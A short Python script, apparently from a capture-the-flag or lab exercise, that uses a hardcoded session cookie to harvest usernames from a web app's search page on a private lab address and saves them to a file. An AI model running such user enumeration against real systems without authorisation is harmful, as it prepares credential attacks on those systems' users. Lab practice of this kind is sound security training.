#!/usr/bin/python3
import requests
import string
from lxml import html


URL = "http://10.129.23.10:8080/search?q={}"
COOKIE = {"PHPSESSID":"4qdjvb48uofld6emehjdb5ks5s"}
UserList = []

for char in string.printable:
    r = requests.get(URL.format(char), cookies=COOKIE)
    tree = html.fromstring(r.content)
    users = tree.xpath('//span[@style="color:gray;"]/text()')
    users = [i.replace('@', '') for i in users]
    for u in users:
        if not u in UserList:
            UserList.append(u)

with open('user_list.txt', 'w') as f:
    for user in UserList:
        f.write("{}\n".format(user))
# print(UserList)